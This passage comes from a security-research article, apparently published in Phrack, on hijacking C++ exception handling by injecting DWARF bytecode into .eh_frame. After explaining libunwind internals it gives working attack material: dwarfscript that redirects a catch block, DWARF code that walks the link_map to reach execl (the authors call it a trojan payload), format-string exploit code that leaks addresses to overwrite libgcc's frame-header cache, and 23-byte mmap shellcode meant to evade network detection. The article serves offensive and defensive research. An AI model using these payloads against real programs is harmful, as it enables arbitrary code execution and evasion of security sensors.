+mechanism continues by calling "dl_iterate_phdr(3)" to walk through
+the list of loaded shared objects. For each DSO, libunwind attempts to
+locate an .eh_frame ([25], [26]) or a .debug_frame (see DWARF specs)
+segment. With the initial EIP value fetched via "unw_getcontext()", the
+current FDE is looked up by checking if the first lies within the FDE's
+"initial_location" and "address_range" members that specify the range
+of instruction pointer values for which the FDE in question applies
+(the DSO's load address is taken into account). While trying to locate
+the appropriate FDE, libunwind parses its parent CIE and may also store
+a pointer to the corresponding LSDA, if one exists.
+
+In section 2.1.1, we mention that the information required to restore the
+register state of a previous frame, are encoded in the current frame's
+DWARF table. This DWARF table is encoded in a form of instructions,
+like a standard ASM program. The instructions are executed using a simple
+stack machine that, when halted, will return the values of the previous
+frame's registers, including the instruction pointer value at the parent
+call site. The instruction stream for a given FDE can be located by 
+following the FDE header field called "instructions".
+
+For example, executing a set of such instructions for some random FDE
+may yield the following semantics:
+
+---------------------------------------------------------------------------
+RAX: stays the same
+
+RBX: its value results by dereferencing the stack pointer plus some
+offset
+
+RCX: its value is the result of executing DWARF expression at address
+0xdeadbeef
+
+RDX: its value is stored in the address returned by evaluating the
+DWARF expression at 0xdeadbabe
+
+...
+
+RIP: its value results by dereferencing CFA (Cannonical Frame Address)
+minus 8
+---------------------------------------------------------------------------
+
+The value of a register sometimes has to be recovered by evaluating a
+DWARF expression. Obviously, once an attacker is able to inject 
+arbitrary DWARF data, he can force certain registers take values by
+executing arbitrary DWARF expressions. This process gives control,
+not only over EIP, but on all general purpose registers used by the
+target architecture. Think of it as having an interpreter (Python?) on
+every running process!
+
+Once the instructions for the current FDE have been processed, the
+unwinder's context is updated with the newly calculated register
+values. Consequently, the new instruction pointer value points to the
+parent call site. The personality routine (see next section) is called
+and if an appropriate exception handler is found, it is dispatched,
+otherwise, the whole process starts over from paragraph one.
+
+  Note: As we have previously stated frame unwiding is a difficult process. An
+  unwinder has to take care of several complexities, one of them being
+  the signal frames and their trampolines. The interested reader must
+  take a look at the appropriate kernel sources for the format of signal
+  frames as well as the signal trampoline code that is mostly interesting
+  those studying the grsecurity code.
+
+
+----[ 2.4.3 - Overall algorithm
+
+A) Using "getcontenxt(3)" or the equivalent ASM code, initiliaze the
+current values of all registers including the frame pointer and the
+instruction pointer
+
+B) Use "dl_iterate_phdr(3)" to walk through all loaded shared objects. 
+Load .eh_frame and/or .debug_frame depending on the configuration
+options
+
+C) If .eh_frame
+
+  C1) Immediatelly locate the appropriate CIE and one FDE using linear
+  search
+
+  C2) Goto E
+
+D) If .debug_frame
+
+  D1) Load the whole DWARF table for the target DSO
+
+  D2) Use binary search to locate the target FDE
+
+E) Execute DWARF CFA instructions for the FDE's CIE
+
+F) Execute FDE's DWARF CFA instructions
+
+G) Evaluate any DWARF expressions pending
+
+G) Store the resulting register state and set the instruction pointer
+to the value calculated at the previous step (EIP now points to a parent
+call site)
+
+H) Call personality routine to handle LSDA
+
+  H1) Read the action table from the LSDA
+
+  H2) If an exception handler (land site) for the current EIP is found,
+  dispatch it. This is an overly complex process that we shouldn't care
+  about now.
+
+I) If end of stack stop, else goto D
+
+
+----[ 2.4.4 - Callgraph of the relevant gcc/libunwind code
+
+As mentioned, we had to left out of this article lots of details regarding
+exception handling. The interested reader is advised to have a look at the 
+gcc and libunwind code using the following callgraph as a reference.
+Exception handling involves so many details that there's not enought space
+to discuss (and, of course, we're still researching).
+
+The functions marked with "(ABx)" where "x" is a number, indicate the
+points of abuse. That is, the DWARF data constructed by the attacker,
+influence the automata implemented by the functions in question. The
+interested reader should pay more attention at the corresponding stack
+machines.
+
+---------------------------------------------------------------------------
+__cxa_throw() 
+[libstdc++v3/libsup++/eh_throw.cc:61]
+
+    _Unwind_RaiseException() 
+    [libunwind-xxx/src/unwind/RaiseException.c:29]
+
+        _Unwind_InitContext() (MACRO)
+        [libunwind-xxx/src/unwind/unwind-internal.h:140]
+
+            unw_getcontext() 
+            [libunwind-xxx/src/x86_64/getcontext.S:37]
+
+            unw_init_local() 
+            [libunwind-xxx/src/x86_64/Ginit_local.c:42]
+
+                common_init()
+                [libunwind-xxx/src/x86_64/init.h:45]
+                # Initializes DWARF cursor using data returned by 
+                # "unw_getcontext()"
+
+                    tdep_init() 
+                    [libunwind-xxx/src/x86_64/Gglobal.c:76]
+
+                        x86_64_local_addr_space_init()
+                        [libunwind-xxx/src/x86_64/Ginit.c:251]
+                        # Sets the appropriate callbacks
+
+
+        unw_step() 
+        [libunwind-xxx/src/x86_64/Gstep.c:56]
+        # Stepping through stack frames
+
+            dwarf_step() 
+            [libunwind-xxx/src/dwarf/Gstep.c:30]
+
+                dwarf_find_save_locs() 
+                [libunwind-xxx/src/dwarf/GParser.c:840]
+                # _Loads_ DWARF data
+
+                    fetch_proc_info() 
+                    [libunwind-xxx/src/dwarf/GParser.c:389]
+
+                      tdep_find_proc_info() (MACRO)
+                      [xxx/include/tdep-x86_64/libunwind_i.h:204]
+
+                          dwarf_find_proc_info()
+                          [xxx/src/dwarf/Gfind_proc_info-lsb.c:742]
+                          # Calls "dl_iterate_phdr(3)"
+
+                              dwarf_callback()
+                              [xxx/src/dwarf/Gfind_proc_info-lsb.c:562]
+                              # "dl_iterate_phdr(3)" callback
+
+                                  dwarf_find_debug_frame()
+                                  [xxx/src/dwarf/Gfind_proc_info-lsb.c:411]
+                                  # Loads .debug_frame
+
+
+                create_state_record_for() 
+                [libunwind-xxx/src/dwarf/GParser.c:657]
+                # _Parses_ DWARF stuff loaded by "dwarf_find_save_locs()"
+
+                   parse_fde()
+                   [libunwind-xxx/src/dwarf/GParser.c:476]
+
+                     run_cfi_program() 
+                     [libunwind-xxx/src/dwarf/GParser.c:60]
+                     # Called once to process CIE's instructions
+                     # (AB1)
+
+                     run_cfi_program() 
+                     [libunwind-xxx/src/dwarf/GParser.c:60]
+                     # Called again to handle own FDE instructions
+                     # (AB2)
+
+
+                apply_reg_state()
+                [libunwind-xxx/src/dwarf/GParser.c:711]
+                # _Evaluates_ the DWARF data parsed by 
+                # "create_state_record_for()"
+
+                   eval_location_expr()
+                   # Called several times to evaluate DWARF expressions 
+                   # (AB3)
+
+
+        # Some functions called again to fetch cached DWARF data.
+        __gxx_personality_v0()
+        [libstdc++v3/libsup++/eh_personality.cc:352]
+        # Personality routine that handles the LSDA
+
+          _Unwind_GetLanguageSpecificData() 
+          [libunwind-xxx/src/unwind/GetLanguageSpecificData.c:29]
+
+            parse_lsda_header()
+            [libstdc++v3/libsup++/eh_personality.cc:54]
+            # Loads action table and so on...
+---------------------------------------------------------------------------
+            
+
+
+---[ 2.5 - Playground
+
+To demo all the theory we've been looking at so far, we need to set up an
+environment so that the reader will be able to reproduce the tests.
+
+This is challenging for many reasons, but we provide all the information 
+regarding our environment and the steps needed to acquire specific 
+information on the target system.
+
+We compiled the GCC with:
+  env CFLAGS="-O0 -g" ./configure --disable-multilib
+
+This is necessary to get libstdc++ and libgcc with debugging symbols. 
+Put the libraries somewhere and add -L /that/path to ldflags. Also add the 
+ld option -rpath /that/path.
+
+The versions of gcc/glibc used are:  gcc-4.5.2 and glibc 2.12.1.
+
+Also, we use the Katana project (developed by the authors and included in
+the paper), version 0.01b.
+
+
+------[ 3 - The Techniques and Comparisons
+
+This chapter contains the core of the article and gives information about 
+how the Dwarf exception handling mechanism can be exploited, examples of 
+instrumenting Dwarf data, and details on different ways to achieve the
+Dwarf injection.
+
+We considered different exploitation scenarios, but didn't try to encompass
+all the situations, since the ones that we created are enough to derive any
+other partial conditions (such as partial overwrites).
+
+
+---[ 3.0 - Katana and Dwarfscript
+
+For details and examples of the usage of Katana and Dwarfscript we 
+recommend the reader to read the chapter 2 of the previous article [1]. The
+tool is being released together with this Phrack article, and future versions
+are going to be available at [17].
+
+
+---[ 3.1 - Dwarf Payloads
+
+Redirecting the flow of execution is simple using Dwarf expressions. One
+could skip a frame when unwinding, set a register to an arbitrary value, 
+and so on.
+
+To start playing with the Dwarf potential for injection, we redirect the
+reader to the attached code samples, in the directory Redirect.
+
+We have a simple program, which takes user input, echoes it back out, and then
+exits. If, however, the user enters the string "error", it throws an exception.
+This is plainly a pointless program, written purely to demonstrate redirecting
+exception handling.
+
+This program executes as follows
+
+$ ./redirect 
+foo
+foo
+
+$ ./redirect 
+error
+Main caught code 1
+
+Katana allows us to print out the information that makes up .eh_frame (and
+.eh_frame_hdr) into a language called dwarfscript, which is nothing more
+than a textual representation of the DWARF binary instructions.
+
+$ katana
+> $e=load "redirect"
+Loaded ELF "redirect"
+> dwarfscript emit ".eh_frame" $e "redirect.dws"
+Wrote dwarfscript to redirect.dws
+
+We then create a slightly modified version, "redirect_mod.dws", which will
+redirect the exception handling. Note that r16 is the "register" (it does
+not correspond to an actual x86_64 hardware register) that is used to hold
+the computed return address for the previous stack frame.
+
+$ diff redirect.dws redirect_mod.dws
+60a61,67
+> #begin new instructions
+> DW_CFA_val_expression r16
+> begin EXPRESSION
+> #an address in the middle of the try block in otherCatch
+> DW_OP_constu 0x400b87
+> end EXPRESSION
+> #end new instructions
+
+We have set up a Katana script (compile.ksh) that will compile this
+dwarfscript into the binary form and shove it back into an executable ELF
+object.
+
+The normal case (without exceptions) still works as before:
+
+$ ./redirect_mod 
+foo
+foo
+
+But if we make it throw an exception
+
+$ ./redirect_mod 
+error
+otherCatch caught code 1
+
+we get a different flow of execution.
+
+This is a first demo of the potential of Katana and its scripting engine.
+
+For a more complex example, lets take one step further and try to load a
+library using the exception handling mechanisms (Directory Linker/).
+
+The first thing we need to do is to find out where the linkmap is stored. 
+We will assume that even with ASLR .dynamic is not remapped. To make things
+easier, we will also be assuming that .got is not remapped. Indeed, if it is
+randomized, then as long as .dynamic is not (and we do not see how it could 
+be, for dynamic linking to work) we can always get it from the PLTGOT 
+.dynamic entry with just a little more work.
+
+PLTGOT starts at 0x601218 for this binary. got would be 0x601220.
+
+We tried on two different machines, where we got:
+ 1- 0xa02d3 in execl may be a good landing pad in libc code. execl starts 
+    at 0xa01a0 in the libc version we have been using. This is dependent on
+    the libc version and build.
+ 2- On the other machine, 0xa04c3 may be a good place to jump to 0xa0390. 
+    There we have an execve with 0x8(%rsp) as the first argument and %r12 
+    as the second.
+
+On the second machine, in test2.cpp, there is 0x3e difference between the
+stack pointer where throw occurs and where register setup is done in
+_Unwind_RaiseException. There is also a 0x80 difference between the base
+pointers. The return base pointer is installed from 0x0(%rbp). r12 is
+installed from 0x20(%rbp).
+
+In our demo test2.cpp we want the exception to fall into 400a18 
+where the address to call will be loaded from -0x28($rbp)
+
+So we put our address in execl into r12. Let irbp be the initial rbp 
+(where the throw ocurred). Then set:
+    rbp=irbp-0x80-0x20+0x28=irbp-0x7c
+
+Dwarf code for finding the right library goes like this:
+
+------------------------------- Dwarf Code --------------------------------
+DW_OP_constu 0x610218   #the address where we will find the 
+                        #address of the linkmap
+DW_OP_deref #dereference above
+#now on the top of the stack we have the address of the beginning of
+#the link map. The important field in link_map for the moment is the
+#l_next field, which we see on 64-bit is 24 bytes from the start of
+#the structure. For the particular program we care about, libc will be
+#the 6th entry in the linkmap chain. We can tell this by looking at
+#its place in the NEEDED entries in .dynamic and adding two. There are
+#two entries with no names first. We do not know why they are there, and
+#we need to test on a variety of systems to see if this holds. Any of
+#this is *not* guaranteed by any standard. If there was randomization
+#going on of any sort we could still function but we would have to
+#compare strings, a lot more operations to do.
+
+#we want to do add 24 to the address and dereference 5 times to get to
+#point to libc
+DW_op_const1u 5
+DW_OP_swap
+#loop begins here
+DW_OP_const1u 24
+DW_OP_add
+DW_OP_deref
+#now at the top of the stack is the address of l_next for the next
+#linkmap entry
+DW_OP_swap #now at the top of the stack is our loop counter
+DW_OP_const1u 1
+DW_OP_minus #decrement
+DW_OP_dup #since bra will pop the top entry
+DW_OP_bra -10 #7 1-byte instructions to top of loop plus 3 bytes for
+              #the bra itself
+#for now let's grab l_addr which is the first field in the linkmap
+#so we just dereference
+DW_OP_deref
+--------------------------------------------------------------------------
+
+The code shows an injection of a trojan payload in a normal binary,
+modifying the .eh_frame.
+
+Our example works for the 'demo' binary we provide. Rebuilding it will
+require tweaking of the Dwarfscript in demo_mod.dws .
+
+Also in the example the setup of arguments on the stack after running the
+dynamic linker is dependent on the precise versions of
+libc/libstdc++/libgcc. We used gcc-4.5.2 and glibc 2.12.1.  
+
+The strength of such an example is that it completely demonstrates the 
+usage of a dynamic linker, thus providing the proof that EVERYTHING can be 
+done using Dwarf bytecode.
+
+
+---[ 3.2 - .eh_frame abusing techniques
+
+In this chapter we will discuss some of the exploitation scenarios that
+arise for usage of the Dwarf Oriented Programming technique.
+
+Note that the examples that we chose are not necessarily in the order of 
+increasing complexity; rather, they are intended to encompass different 
+possibilities.
+
+We chose to use the exploitation primitives you need or might have
+instead of the vulnerability being exploited.
+
+Obviously, if you have a write N, where N is bigger than 4, you can use the
+reduced approach while exploiting the primitive that gives you more
+control. We just wanted to demonstrate common scenarios that can be abused 
+using the presented technique.
+
+
+---[ 3.2.1 - Using a write4 to overwrite the cache pointer
+
+If you have a write 4 primitive you are capable of replacing the cache
+pointer for the .eh_frame segment and thus inject your own Dwarf bytecode.
+
+The libgcc caches the GNU_EH_FRAME header in unwind-dw2-fde-glibc.c:
+
+
+------------------ gcc-4.5.2/gcc/unwind-dw2-fde-glibc.c -------------------
+...
+#define FRAME_HDR_CACHE_SIZE 8
+...
+static struct frame_hdr_cache_element
+{
+  _Unwind_Ptr pc_low;
+  _Unwind_Ptr pc_high;
+  _Unwind_Ptr load_base;
+  const ElfW(Phdr) *p_eh_frame_hdr;
+  const ElfW(Phdr) *p_dynamic;
+  struct frame_hdr_cache_element *link;
+} frame_hdr_cache[FRAME_HDR_CACHE_SIZE];
+
+...
+---------------------------------------------------------------------------
+
+The basic idea is that there are 8 cache entries for the frame header. The
+cache uses a least used replacement algorithm (_Unwind_IteratePhdrCallback()) 
+and keeps the most recently used as the head of the list.
+
+In our environment, frame_hdr_cache is at 0x6e0 bytes from the
+offset of the writable data segment for libgcc.  This is an array of
+structure frame_hdr_cache_element, with size of 48 bytes.  The executable
+will be the 3rd element of this array (the first two elements are libgcc
+and libstdc++).  The offset from the writable data segment for libgcc thus
+is:  0x6e0+48*2=0x740.   The p_eh_frame_hdr member that we want to write
+is 24 bytes into the structure.
+
+To demonstrate that, we created the Cached_eh/ example attached to this
+article.   There, we have:
+	0x7ffff760e000 is the address libgcc has been getting loaded on
+our system
+	0x220000 is the offset of the writable data segment from the load
+base
+	0x6e0 is the offset of the start of the cache from the base of the
+writable data segment
+	48 bytes is the size of each cache entry
+	2 cache entries are ahead of ours (use readelf -d to see that)
+	24 bytes into the structure is the word we want to write to
+
+The first example of how to abuse certain primitives will be done through a
+format string vulnerability.  We use format string due to the amount of
+control we have over the address space of the program.
+
+The directory Format/ contains the vulnerable code, the Katana scripts and
+the exploit code.
+
+To simplify the exploitation, we pad the created structures in the
+dictionary file so they are in specific offsets (the target program reads
+in a dictionary file):
+	.eh_frame is padded so it starts exactly at 0x50 bytes from
+the beginning of the .eh_frame_hdr
+	.gcc_except_table is padded so it starts exactly at 0x200 bytes
+from the start of the .eh_frame
+
+Due to the nature of a format string, we use it to leak information
+regarding the frame state in the target process.
+
+To calculate the EBP_PREVIOUS, we use %llx to use 4 bytes of space in our
+buffer and advance the implicit stack pointer in 8 bytes:
+
+----------------------------------------------------------------------------
+...
+#to get the value of ebp_previous
+instr=r"%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%llx%x
+%x"
+proc.sendline(instr)
+proc.expect("unknown command: [0-9a-f]* ([0-9a-f]*).*")
+ebp_previous=int(proc.match.group(1),16)
+info("\nfound ebp_previous = 0x%x" % ebp_previous)
+----------------------------------------------------------------------------
+
+We know the size of the previous frame (by disassembling the functions),
+so we now able to calcule the ebp value of our frame:
+
+----------------------------------------------------------------------------
+ebp=ebp_previous-PREV_FRAME_SIZE
+info("calculated ebp=0x%x" % ebp)
+----------------------------------------------------------------------------
+
+With our address, we can compute the libgcc address since we know the
+offsets:
+
+----------------------------------------------------------------------------
+libgcc_reveal_location=ebp-LIBGCC_REVEAL_EBP_OFFSET;
+info("calculated address whose contents will reveal libgcc: 0x%x" %
+libgcc_reveal_location)
+----------------------------------------------------------------------------
+
+The value revealing the libgcc .text location is at 0xffffc798, which is
+0x678 below esp and 0x750 below ebp.
+
+The base of libgcc is calculated by taking the reveal location and
+masking out the 3 low-order nibbles.  We also use a fixed adjust value
+to find it:
+
+----------------------------------------------------------------------------
+libgcc_base=(libgcc_revealed & 0xFFFFF000) - LIBGCC_REVEAL_ADJUST
+info("Calculated libgcc_base=0x%x" % libgcc_base)
+----------------------------------------------------------------------------
+
+We note that 0x19000 is the separation between the .text and .data
+segments for libgcc on x86.
+
+----------------------------------------------------------------------------
+libgcc_data_base=libgcc_base+LIBGCC_DATA_OFFSET
+info("Calculated libgcc_data_base=0x%x" % libgcc_data_base)
+----------------------------------------------------------------------------
+
+Finally we can find the frame_hdr_cache and the respective p_eh_frame_hdr
+from the libgcc_data_base, exactly like in the previous example:
+
+----------------------------------------------------------------------------
+frame_hdr_cache=libgcc_data_base+CACHE_LIBGCC_OFFSET
+info("Calculated frame_hdr_cache=0x%x" % frame_hdr_cache)
+p_eh_frame_hdr=frame_hdr_cache+CACHE_ENTRY_SIZE*PREVIOUS_CACHE_ENTRIES+OFFSET_IN_CACHE_ENTRY
+info("Calculated p_eh_frame_hdr address to be 0x%x" % p_eh_frame_hdr)
+----------------------------------------------------------------------------
+
+For the vulnerable program, the 128-byte buffer starts at %esp+16, and the
+internal stack pointer starts at %esp+4.
+
+Just after the buffer we have %esp+144, which is 140 byte increase of the
+internal stack pointer, which is 17 of our %llx sequence and one %x.  The
+%ebp for the previous stack is stored at the old %ebp which is %esp+216.
+The additional space is probably for alignment purposes, but we don't
+really care. To hit the %esp+216 we need to consume 212 bytes on the
+stack. We do this with 26 of our 4 byte sequence and then one %x followed 
+by a space (for identification purpose) and then one more %x to read the 
+actual value. Right now we've been using 109 bytes out of the 127 bytes 
+available.
+
+An example of the values we are trying to find in our system (running under
+gdb):
+
+---------------------------------------------------------------------------
+=====Experimental Observations From Binary:====
+prev_frame_size: 0x10
+libgcc_reveal_ebp_offset: 0x750 
+libgcc_data_offset: 0x19000 
+cache_libgcc_offset: 0x8c0
+
+=====Determined at Runtime Through Exploit=====
+ebp_previous: 0xffffd278 (see explanation above)
+ebp: 0xffffd268 (calculated as prev_frame_size less than ebp_previous)
+libgcc_reveal_location: 0xffffcb18 (calculated as libgcc_reveal_offset
+                                   less than ebp)
+
+libgcc_revealed: 0xf7e89acc (dereference value above)
+libgcc_base: 0xf7e89000 (align properly)
+libgcc_data_base: 0xf7ea2000 (libgcc_base+0x19000)
+frame_hdr_cache: 0xf7ea28c0 (cache_libgcc_offset after libgcc_data_base)
+p_eh_frame_hdr: 0xf7ea28fc (24 bytes an entry, 3rd entry 12 bytes
+                            in. frame_hdr_cache + 2*24+12)
+---------------------------------------------------------------------------
+
+Knowing that, we just do the same insertion as before:
+    - doWork starts at 0x0804936a
+    - the throw we want is at 0x8049634
+
+They are 0x2ca apart, so the call site we want to alter is the call site 14
+in dict_mod.dws.
+
+In our scenario, we force the execution of the catch block
+I_am_never_called which is at 0x8049842.  From the start of doWork, it is
+in an offset of 0x4d8 bytes, so we modify the call site 14 appropriately.
+
+We want to read our dwarf_payload.dat as the dict file and will need to fix
+up the address in the program header, then overwrite the catch with the
+location. This is what the exploit does.
+
+
+---[ 3.2.2 - Using a writeN to overwrite the .eh_frame
+
+We obviously demonstrated a more complex technique in the previous section to
+point out a problem in the actual implementation: the cache pointer for the
+.eh_frame is in a writable memory area.
+
+
+---[ 3.2.3 - Shellcode execution to replace .eh_frame: Avoiding the usage
+             of decoders
+
+An interesting usage for the technique, usually ignored is to avoid the
+usage of decoders in order to bypass sensors or filters.
+
+With the evolution of techniques to detect shellcode passing through the
+network [18], a minimalistic shellcode could remap the .eh_frame as writable
+and then overwrite it with a Dwarf payload (much more complex to emulate
+and detect).
+
+Detecting the above shellcode through emulation is hard due to its size (23
+bytes) and high number of false positives generated. Using this together
+with ROP (either to do the remapping or to do the copying) is also a
+possibility.
+
+----------------------- mmap a segment as writable ------------------------
+# This is only an example that maps NULL as writable|executable
+# You can actually change a mapping and avoid the usage of the executable 
+# mark
+
+mmap_shellcode.o:     file format elf32-i386
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:   31 c0                   xorl   %eax,%eax
+   2:   31 c9                   xorl   %ecx,%ecx
+   4:   51                      pushl  %ecx
+   5:   51                      pushl  %ecx
+   6:   6a 22                   pushl  $0x22
+   8:   6a 07                   pushl  $0x7
+   a:   66 51                   pushw  %cx
+   c:   66 68 ff 0f             pushw  $0xfff
+  10:   51                      pushl  %ecx
+  11:   b0 5a                   movb   $0x5a,%al
+  13:   89 e3                   movl   %esp,%ebx
+  15:   cd 80                   int    $0x80
+---------------------------------------------------------------------------
+
+Clearly, ROP-based techniques also bypass the detection, unless the sensors
+start to detect sequences of valid addresses in .text segments as an
+attack.
+
+
+---[ 3.2.4 - Ret-into-lib to remap the .eh_frame pages as writable
+
+At first thought we strongly believed that this was a way we could bypass
+the mprotect [19] feature of PaX.
+
+This feature, together with other pieces of the PaX puzzle, makes
+exploitability of vulnerabilities much harder. Bypassing mprotect could
+give attackers a reduction of the protection level of the system as a
+whole.
+
+We thought this was actually a reduction because only remapping the actual
+.eh_frame (which is RO in most modern systems) to writable again (using
+ret-into mmap), overwriting it (using ret-into-sprintf) with a new Dwarf
+code, and then throwing an exception (without ever mapping the .eh_frame
+section as executable) is enough for achieving full control over the
+application.
+
+NOTE:
+Use the below script to check for libraries with writable .eh_frame:
+
+---------------------- search for writable .eh_frame ----------------------
+#!/bin/sh
+#Description: given a filepath, looks for .so libraries with writeable
+#             eh_frame.
+
+if [ -z $1 ]; then
+  echo "You must specify the path to search for libraries" >&2
+  exit 1
+fi
+
+files=`find $1 -iname "*.so*"`
+for file in $files; do
+  afterCount=1
+  is64Bit=`readelf -h $file | grep Class | grep ELF64`
+  if [ -z "$is64Bit" ] ; then
+    afterCount=0
+  fi
+    result=`readelf -S "$file" | grep -A $afterCount .eh_frame | grep WA`
+    if [ -n "$result" ]; then
+        echo $file
+    fi
+done
+---------------------------------------------------------------
+
+Even before testing this, the PaX Team and Spender clarified they had been
+preventing such ideas from the beginning (mprotect does not allow us to
+remap the segment to be writable again). Thanks for such a great project
+and for always be willing to share.
+
+Anyway, we gave it a try. And they are right ;) 
+
+
+---[ 3.3 - ROP x .eh_frame
+
+One of the biggest arguments against this paper's technique is about its
+complexity (locate the .eh_frame section, locate the cached pointer, create
+the Dwarf payload).
+
+Together with the article, we are providing the source code for Katana,
+which solves the third problem.
+
+Locating addresses in the target system is a challenge for the exploit
+writer. Bypassing mitigation resources adds another layer of complexity.
+Different memory leaks [see section 3.3.1] are required in order to create
+a reliable exploit using either, ROP or Dwarf-based, techniques. Faking 
+stack frames in the heap is very complex, as is using ROP-based 
+techniques together with heap overflows.
+
+The technique presented in this paper is thus very interesting in the 
+following scenarios:
+    - Write of non-controllable values to partially controlled addresses 
+      (e.g, IIS FTP [20]). The Dwarf-based technique described in this paper 
+      gives us another possibility, thus increasing our chances to find a
+      reliable way to exploit such issues.
+    - Heap overflows that lead to a write4 primitive, but no suitable 
+      executable memory addresses, are controlled (and you don't have 
+      interesting pointers to overwrite in the offset).
+      If you have a good enough view of the process memory layout (I.E. no 
+      ASLR or full memleaks) you can overwrite the cached pointer and get 
+      reliable code execution.
+
+
+
+------[ 4 - Future
+
+We can't foresee the future. We hope that more researchers are going to
+contribute to the project, helping it to grow and achieve maturity.
+
+Also, we strongly believe that security community as a whole should put
+more efforts into understanding software vulnerabilities, in order to
+determine by themselves exploitability instead of trusting other parties.
+
+This is the only way to have a better coverage on the vulnerabilities being
+released.
+
+Last, but not less important, the community effort is the most important
+and probably the only way for the security to become an even game, so we do
+expect more people to pay attention to initiatives such as Phrack and to
+forget a bit about the fame that come with conferences in Vegas.
+
+
+------[ 5 - Acknowledgments
+
+A lot of people helped us in the course of this research that resulted in 
+something interesting (at least to us) to be published. You all know who you
+are.
+
+BSDaemon:
+    I would like to say that I really appreciate the opportunity to participate
+in this research and to somehow collaborate with ideas and with the final 
+writing of this paper.
+    It is important to me to make it clear that my participation was 
+minimal, since I only got all the research Electron and SBratus did on this
+subject and found a way to use it during exploitation phase of a 
+vulnerability.
+    SBratus is one of the smartest person I ever met and I really enjoyed 
+all the opportunities I had to discuss things with him (actually, I was 
+about to compare him to an encyclopaedia, but this is a stupid comparison, 
+since the encyclopaedia has only raw information, while SBratus is 
+impressively able to process the whole amount of information to give very 
+useful and enlightening criticisms).
+
+Special tks to the Phrack Staff for the great review of the article, giving
+a lot of important insights about how to better structure it and giving a
+real value to it.  Too bad it didn't manage to be finished in time.
+
+To ravage, for the very impressive feedbacks and reorganization/rewriting of the
+section 2, thank you very much!
+
+Thanks to conference organizers who invited us to talk about Software 
+Exploitation. Even after many people already talked on this subject, they 
+trusted that our talk was not more of the same. 
+
+
+------[ 6 - References
+
+[1] Oakley, James; Bratus, Sergey.  "Exploiting the hard-working Dwarf:
+Trojan and Exploit Techniques Without Native Executable Code"; Dartmouth
+Computer Science Technical Report TR2011-688.
+
+[2] TIS Committee.  "Executable and linking format (ELF) specification";
+Version 1.2 1995.
+
+[3] Microsoft Corporation. "Structured Exception Handling (C++). MSDN 2010.
+
+[4] Corelan. "Exploit writing tutorial part 3b: SEH Based"
+http://www.corelan.be/index.php/2009/07/28/seh-based-exploit-writing-
+tutorial-continued-just-another-example-part-3b/
+
+[5] Corelan. "Exploit writing tutorial part 6: Bypassing Stack Cookies"
+http://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-
+bypassing-stack-cookies-safeseh-hw-dep-and-aslr/
+
+[6] Dwarf Debugging Information Format Committee.  "Dwarf Debugging
+information format version 4"
+http://dwarfstd.org
+
+[7] Dinechin, Christophe de.  "C++ Exception Handling for IA-64".  Usenix 
+Wiess 2000.
+www.usenix.org/events/osdi2000/wiess2000/full_papers/dinechin/dinechin_html
+
+[8] GCC Wiki. "Windows GCC Improvements"
+gcc.gnu.org/wiki/WindowsGCCImprovements
+
+[9] MingW Wiki.  "GCC Status"
+www.mingw.org/wiki/GCCStatus
+
+[10] One, Aleph.  "Smashing the stack for fun and profit".  
+Phrack Magazine 7,49 1996.
+
+[11] SolarDesigner.  "Getting around non-executable stack (and fix)".
+Bugtraq Mailing List 1997.
+http://seclists.org/bugtraq/1997/Aug/63 
+
+[12] Nergal.  "The advanced return-into-lib(c) exploits:  Pax case study".
+Phrack Magazine 4, 58 2001.
+
+[13] Shacham, H.  "The geometry of innocent flesh on the bone: 
+return-into-libc without function calls (on the x86)".  
+Proceedings of the 14th ACM conference on computer and communications 
+security (CCS) 2007.
+
+[14] Skape.  "Locreate:  An anagram for relocate".  Uninformed 6 2007.
+
+[15] Linux Standard Base Core Specification 4.0
+http://refspecs.linux-foundation.org/LSB_4.0.0/LSB-Core-generic/
+
+[16] Michael, Matz; Ka, Jan Hubi; A.J.M.M.  "System V Application Binary
+Interface:  AMD64 Architecture Processor Supplement - draft version 0.99.5
+ed".  2010
+
+[17] Oakley, J., Bratus, S. "Katana hotpatching tool". 2010.
+http://katana.nongnu.org 
+
+[18] Branco, R.,  Hirata, C.  Shellcode Detection in the Network. 2011.
+
+[19] PaX Team.  "mprotect design"
+http://pax.grsecurity.net/docs/mprotect.txt
+
+[20] Valasek, Chris; Smith, Ryan.  "Modern Heap Exploitation using Low 
+Fragmentation Heap".  Infiltrate 2011.
+
+[21] X Window Font Server
+http://en.wikipedia.org/wiki/X_Window_System
+http://www.x.org/wiki/
+
+[22] Code Sourcery.  "Exceptions ABI". 
+http://www.codesourcery.com/public/cxx-abi/exceptions.pdf
+
+[23] HP. "Introduction to dynamic unwind-info".
+http://www.hpl.hp.com/research/linux/libunwind/man/libunwind-dynamic%283%29.php
+
+[24] Mosberger-Tang, D.  "unw_getcontext(3)"
+http://www.nongnu.org/libunwind/man/unw_getcontext%283%29.html
+
+[25] Linux Foundation. "Linux Standard Base Specification 1.3"
+http://refspecs.linuxfoundation.org/LSB_1.3.0/gLSB/gLSB/ehframehdr.html
+
+[26] Linux Foundation. "Linux Standard Base Core Specification 3.0RC1"
+http://refspecs.linuxfoundation.org/LSB_3.0.0/LSB-Core-generic/LSB-Core-generic/ehframechpt.html
+
+[27] Degener, J. "ANSI C Yacc grammar"
+http://www.lysator.liu.se/c/ANSI-C-grammar-y.html
+
+
+------[ 7 - Downloadable Materials
+
+Further updates will be available in the Katana Project Website at:
+	http://katana.nongnu.org
+
+An updated version of the paper will be available at our github repository:
+	https://github.com/rrbranco/defcon2012
+
+All other downloadable materials, including demos, exploits and further 
+research are also available in the github.
